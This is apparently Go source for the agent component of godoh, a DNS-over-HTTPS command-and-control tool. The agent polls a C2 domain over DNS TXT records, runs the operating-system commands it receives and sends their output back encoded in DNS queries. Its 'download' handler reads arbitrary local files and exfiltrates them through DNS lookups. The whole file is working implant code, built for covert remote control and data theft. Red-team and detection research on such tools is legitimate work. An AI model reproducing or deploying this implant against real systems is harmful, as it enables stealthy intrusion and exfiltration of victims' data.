package cmd

import (
	"encoding/hex"
	"fmt"
	"io/ioutil"
	"os"
	"os/exec"
	"strings"
	"time"

	"github.com/miekg/dns"
	"github.com/sensepost/godoh/dnsclient"
	"github.com/sensepost/godoh/protocol"
	"github.com/sensepost/godoh/utils"
	"github.com/spf13/cobra"

	log "github.com/sirupsen/logrus"
)

var agentCmdAgentName string
var agentCmdAgentPoll int

// agentCmd represents the agent command
var agentCmd = &cobra.Command{
	Use:   "agent",
	Short: "Connect as an Agent to the DoH C2",
	Long: `Connect as an Agent to the DoH C2.

Example:
	godoh --domain example.com agent
	godoh --domain example.com agent -n agent1
	godoh --domain example.com agent --agent-name agent1 --poll-time 5`,
	Run: func(cmd *cobra.Command, args []string) {

		if agentCmdAgentName == "" {
			agentCmdAgentName = utils.RandomString(5)
		}

		agentLogger := log.WithFields(log.Fields{"module": "agent", "ident": agentCmdAgentName})

		agentLogger.Info("Starting polling...")

		for {
			// Wait for the next poll!
			time.Sleep(time.Second * time.Duration(agentCmdAgentPoll))

			// Do lookup
			response := dnsclient.Lookup(dnsProvider,
				fmt.Sprintf("%x.%s", agentCmdAgentName, dnsDomain), dns.TypeTXT)

			// Do nothing.
			if strings.Contains(response.Data, protocol.NoCmdTxtResponse[0]) {
				continue
			}

			if strings.Contains(response.Data, protocol.ErrorTxtResponse[0]) {
				agentLogger.Error("Server indicated an error. Stopping :(")
				continue
			}

			if strings.Contains(response.Data, protocol.CmdTxtResponse[0]) {

				cmdParsed := strings.Split(response.Data, "p=")[1]
				cmd := strings.Split(cmdParsed, "\"")[0]
				agentLogger.WithFields(log.Fields{"cmd-data": cmd}).Info("Got command data to execute, processing")

				// decode the command
				dataBytes, err := hex.DecodeString(cmd)
				if err != nil {
					agentLogger.WithFields(log.Fields{"err": err}).Error("Failed to decode command data")
					return
				}

				var command string
				utils.UngobUnpress(&command, dataBytes)
				agentLogger.WithFields(log.Fields{"cmd": command}).Info("Decoded command")

				// Execute the command!
				commandSplit := strings.Split(command, " ")
				cmdBin := commandSplit[0]
				cmdArgs := commandSplit[1:]

				// TODO: Check if the command is a `cd` command.
				// If so, set something like cmd.Cwd

				// File download
				if cmdBin == "download" {
					agentLogger.Info("Command is for a file download")
					if err := downloadFile(strings.Join(cmdArgs, " "), agentLogger); err != nil {
						// silently fail
						agentLogger.WithFields(log.Fields{"err": err}).Error("Failed to download file")
					}
					continue
				}

				// Exec an os command
				agentLogger.Info("Command interpreted as OS command")
				go executeCommand(cmdBin, cmdArgs, agentLogger)
				continue
			}
		}
	},
}

func init() {
	rootCmd.AddCommand(agentCmd)

	agentCmd.Flags().StringVarP(&agentCmdAgentName, "agent-name", "n", "", "Agent name to use. (default: random)")
	agentCmd.Flags().IntVarP(&agentCmdAgentPoll, "poll-time", "t", 10, "Time in seconds between polls.")
}

func executeCommand(cmdBin string, cmdArgs []string, logger *log.Entry) {

	out, err := exec.Command(cmdBin, cmdArgs...).CombinedOutput()
	if err != nil {
		out = []byte(err.Error())
	}

	// Send the response back to the server!
	commandOutput := protocol.Command{}
	commandOutput.Data = out
	commandOutput.ExecTime = time.Now()

	commandOutput.Prepare(cmdBin + strings.Join(cmdArgs, " "))
	requests, successFlag := commandOutput.GetRequests()

	logger.WithFields(log.Fields{
		"request-count":  len(requests),
		"cmd-output-len": len(out),
	}).Info("Sending command output back")

	for _, r := range requests {
		response := dnsclient.Lookup(dnsProvider, fmt.Sprintf("%s.%s", r, dnsDomain), dns.TypeA)

		if response.Data == successFlag {
			logger.WithFields(log.Fields{
				"response": response.Data,
				"labels":   r,
			}).Info("Successful request made")
		} else {
			logger.WithFields(log.Fields{
				"response": response.Data,
				"labels":   r,
			}).Info("Server did not respond with a successful ack. Exiting")
			fmt.Println("")
			return
		}
	}
}

func downloadFile(fileName string, logger *log.Entry) error {

	file, err := os.Open(fileName)
	if err != nil {
		return err
	}
	defer file.Close()

	fileInfo, err := file.Stat()
	if err != nil {
		return err
	}

	fileBuffer, err := ioutil.ReadAll(file)
	if err != nil {
		return err
	}

	message := protocol.File{}
	message.Prepare(&fileBuffer, fileInfo)
	requests, successFlag := message.GetRequests()

	for _, r := range requests {
		response := dnsclient.Lookup(dnsProvider, fmt.Sprintf("%s.%s", r, dnsDomain), dns.TypeA)

		if response.Data == successFlag {
			logger.WithFields(log.Fields{
				"response": response.Data,
				"labels":   r,
			}).Info("Successful request made")

		} else {
			logger.WithFields(log.Fields{
				"response": response.Data,
				"labels":   r,
			}).Info("Server did not respond with a successful ack. Exiting")

			return nil
		}
	}

	return nil
}
